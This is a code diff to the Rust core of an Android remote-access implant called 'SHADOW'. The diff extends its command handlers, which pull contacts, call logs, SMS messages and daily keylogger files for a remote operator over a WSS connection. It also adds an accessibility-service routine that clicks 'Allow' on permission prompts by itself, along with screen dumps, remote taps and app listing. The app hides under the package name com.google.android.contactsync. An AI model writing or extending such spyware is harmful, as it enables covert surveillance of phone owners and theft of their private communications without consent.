@@ -1,5 +1,6 @@
 //! SHADOW Core — Built-in command execution + WSS transport with reconnect.
 
+pub mod android_bridge;
 pub mod transport;
 
 use jni::objects::{JClass, JString};
@@ -41,27 +42,53 @@ fn cmd_shell(cmd: &str) -> String {
     }
 }
 
+// Data extraction — all via ContentResolver with our OWN uid (no root, no Shizuku).
+// The runtime permissions are obtained by the a11y auto-grant flow.
 fn cmd_contacts() -> String {
-    cmd_shell("content query --uri content://com.android.contacts/contacts --projection display_name:1,starred:1 --where '1=1' 2>/dev/null | head -500")
+    android_bridge::query_provider(
+        "content://com.android.contacts/data/phones".into(),
+        "display_name,data1,data2".into(),
+        2000,
+    )
 }
 
 fn cmd_calllog() -> String {
-    cmd_shell("content query --uri content://call_log/calls --projection number:1,date:1,type:1,duration:1 --where '1=1' 2>/dev/null | head -200")
+    android_bridge::query_provider(
+        "content://call_log/calls".into(),
+        "number,date,type,duration,cached_name".into(),
+        1000,
+    )
 }
 
 fn cmd_sms() -> String {
-    cmd_shell("content query --uri content://sms/inbox --projection address:1,body:1,date:1 --where '1=1' 2>/dev/null | head -200")
+    android_bridge::query_provider(
+        "content://sms".into(),
+        "address,body,date,type".into(),
+        1000,
+    )
 }
 
 fn cmd_grant(permission: &str) -> String {
-    cmd_shell(&format!("pm grant com.google.android.contactsync android.permission.{} 2>&1", permission))
+    // `pm grant` needs shell/root — useless on a real device.
+    // Instead: open Settings and let the a11y service click Allow.
+    let _ = permission;
+    android_bridge::a11y_start_autogrant()
+}
+
+fn cmd_perms() -> String {
+    android_bridge::granted_permissions()
+}
+
+fn cmd_screen() -> String {
+    android_bridge::a11y_dump_screen()
 }
 
 fn cmd_keylog_file() -> String {
-    // Read today's keylog file
     let date = cmd_shell("date +%Y-%m-%d");
-    let date_clean = date.trim();
-    let path = format!("/data/data/com.google.android.contactsync/files/keylogs/keylog_{}.txt", date_clean);
+    let path = format!(
+        "/data/data/com.google.android.contactsync/files/keylogs/keylog_{}.txt",
+        date.trim()
+    );
     cmd_fs_read(&path)
 }
 
@@ -138,12 +165,27 @@ fn execute_command(cmd: &str, payload: &serde_json::Value) -> Option<String> {
         "contacts" => Some(cmd_contacts()),
         "calllog" => Some(cmd_calllog()),
         "sms" => Some(cmd_sms()),
-        "grant" => {
+        "grant" | "autogrant" => {
             let perm = payload.as_str()
                 .or_else(|| payload.get("permission").and_then(|v| v.as_str()))
-                .unwrap_or("READ_CONTACTS");
+                .unwrap_or("ALL");
             Some(cmd_grant(perm))
         }
+        "perms" | "permissions" => Some(cmd_perms()),
+        "screen" | "dump" => Some(cmd_screen()),
+        "click" => {
+            let needle = payload.as_str()
+                .or_else(|| payload.get("text").and_then(|v| v.as_str()))
+                .unwrap_or("");
+            if needle.is_empty() {
+                Some("usage: click <text|#resource_id>".into())
+            } else if let Some(id) = needle.strip_prefix('#') {
+                Some(android_bridge::a11y_click_id(id))
+            } else {
+                Some(android_bridge::a11y_click_text(needle))
+            }
+        }
+        "apps" | "running" => Some(android_bridge::running_apps()),
         "keylog_file" => Some(cmd_keylog_file()),
         "keylog_list" => Some(cmd_keylog_list()),
         _ => None, // Unknown command — don't respond
@@ -301,6 +343,11 @@ pub extern "system" fn Java_com_shadow_ShadowCore_nativeInit(
 
     if STARTED.swap(true, Ordering::SeqCst) {
         return 0;
+    }
+
+    // Stash the JavaVM so background threads can call back into Kotlin.
+    if let Ok(vm) = env.get_java_vm() {
+        android_bridge::set_vm(vm);
     }
 
     let domain: String = env.get_string(&domain_jstr).unwrap().into();
